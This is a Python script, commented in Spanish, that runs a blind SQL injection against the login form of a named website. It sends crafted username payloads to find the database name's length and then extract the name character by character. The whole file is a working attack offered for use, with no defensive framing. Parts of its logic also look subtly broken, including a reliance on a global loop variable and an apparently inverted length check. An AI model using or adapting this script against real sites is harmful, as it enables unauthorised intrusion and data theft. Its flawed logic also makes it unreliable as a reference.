import requests

url = "http://www.segurilock.com"  # Reemplaza esto con la URL del sitio a atacar
database_length = 0
found = False
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

# Función para enviar la consulta SQL y verificar si devuelve un error o no
def send_query(query):
    payload = {
        "username": f"' OR (SELECT LENGTH(database())={database_length} AND substr(database(),1,{i})='{query}')-- -",
        "password": "anything"
    }
    response = requests.post(url, data=payload)
    return "Error de sintaxis" not in response.text

# Descubrir la longitud del nombre de la base de datos
while not found:
    database_length += 1
    payload = {
        "username": f"' OR LENGTH(database())={database_length}-- -",
        "password": "anything"
    }
    response = requests.post(url, data=payload)
    if "Error de sintaxis" in response.text:
        found = True

# Descubrir el nombre de la base de datos
database_name = ""
for i in range(1, database_length + 1):
    found_char = False
    for char in charset:
        if send_query(database_name + char):
            database_name += char
            found_char = True
            break
    if not found_char:
        break

print("Nombre de la base de datos:", database_name)
